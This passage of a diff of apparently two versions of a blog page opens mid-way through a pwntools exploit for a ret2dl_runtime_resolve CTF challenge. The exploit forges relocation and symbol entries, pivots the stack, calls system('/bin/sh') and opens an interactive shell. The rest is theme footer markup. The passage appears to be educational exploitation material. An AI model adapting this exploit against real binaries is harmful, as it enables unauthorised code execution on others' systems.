((fake_sym_addr - dynsym) &amp; 0xf) </span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10  </span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)  </span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 1   bss_addr</span><br><span class="line">payload = &quot;a&quot;*112 </span><br><span class="line">payload += p32(read_plt) # 读100个字节到base_stage</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(100)</span><br><span class="line">payload += p32(pop_ebp) # 把base_stage pop到ebp中</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 2   system(&apos;/bin/sh&apos;)</span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += fake_reloc # stack_addr+28</span><br><span class="line">payload2 += &apos;A&apos; * align</span><br><span class="line">payload2 += fake_sym # stack_addr+36+align</span><br><span class="line">payload2 += &quot;system\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
-    </div>
-
-    
-
-    
-
-    <!-- Comments -->
-    
-
-</div>
-        </section>
-
-    </div>
-</div>
-
-
-</div>
-
-<!-- Footer -->
-<div class="push"></div>
-
-<footer class="footer-content">
-    <div class="container">
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
-                <h2>About</h2>
-                <p>
-                    
-                </p>
-            </div>
-            
-    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
-        <h2>Recent Posts</h2>
-        <ul>
-            
-            <li>
-                <a class="footer-post" href="/2019/10/07/runtime-resolve/">runtime_resolve</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2019/09/02/srop/">srop</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2019/08/20/playfmt/">suctf的两三题wp</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2019/08/16/overwrite/">partial overwrite</a>
-            </li>
-            
-        </ul>
-    </div>
-
-
-
-            
-<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
-    <h2>Categories</h2>
-    <ul>
-        
-        <li>
-            <a class="footer-post" href="/categories/�����/">�����</a>
-        </li>
-        
-    </ul>
-</div>
-
         </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <ul class="list-inline footer-social-icons">
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                </ul>
-            </div>
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <div class="footer-copyright">
-                    
-                </div>
-            </div>
-        </div>
+      </div>
     </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
 </footer>
 
-<!-- After footer scripts -->
 
-<!-- jQuery -->
-<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
 
-<!-- Tween Max -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
-
-<!-- Gallery -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
-
-<!-- Custom JavaScript -->
-<script src="/js/main.js"></script>
-
-<!-- Disqus Comments -->
-
-
-
-</body>
-
+  </body>
 </html>
+
